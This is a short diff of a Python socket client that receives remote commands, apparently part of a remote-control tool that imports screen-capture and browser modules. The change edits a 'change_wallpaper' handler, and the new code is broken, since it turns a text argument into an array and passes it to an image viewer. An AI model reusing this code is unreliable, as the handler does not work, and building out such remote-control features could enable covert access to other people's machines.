@@ -6,6 +6,7 @@ import webbrowser
 from PIL import ImageGrab
 import requests
 import cv2
+import numpy as np
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
@@ -48,7 +49,7 @@ class Client():
         if self.command.startswith("change_wallpaper"):
             print(self.command)
             _,_WALLPAPER_TO_CHANGE=self.command.split("=")
-            print(type(_WALLPAPER_TO_CHANGE))
+            _WALLPAPER_TO_CHANGE=np.array(_WALLPAPER_TO_CHANGE)
             cv2.imshow("Test",_WALLPAPER_TO_CHANGE)
             cv2.waitKey(0)
     @property
